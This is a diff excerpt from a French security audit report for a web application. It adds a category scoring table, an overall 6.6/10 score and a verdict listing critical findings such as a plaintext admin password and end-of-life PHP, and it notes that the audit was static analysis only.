-- **CSRF Protection :** https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
-- **XSS Prevention :** https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
+| Catégorie | Score |
+|-----------|-------|
+| Authentification & Autorisation | 7/10 |
+| Protection des données | 7/10 |
+| Configuration serveur | 6/10 |
+| Gestion des secrets | 6/10 |
+| Headers de sécurité | 8/10 |
+| CI/CD Security | 7/10 |
+| Dépendances | 5/10 |
+| **Score Global** | **6.6/10** |
+
+> **Verdict :** L'architecture de sécurité est **globalement solide** avec de bonnes pratiques en place (CSRF, CORS, JWT HttpOnly, CSP, HSTS). Les points critiques identifiés (mot de passe admin en clair, PHP EOL, incohérence documentation JWT) doivent être adressés avant une mise en production définitive.
 
 ---
 
-**Rapport établi par :** Audit de Sécurité Automatisé  
-**Date :** 11 février 2026  
-**Prochaine revue recommandée :** Après implémentation des correctifs
-
-
+*Audit réalisé par analyse statique du workspace. Un audit dynamique (pentest) est recommandé en complément.*
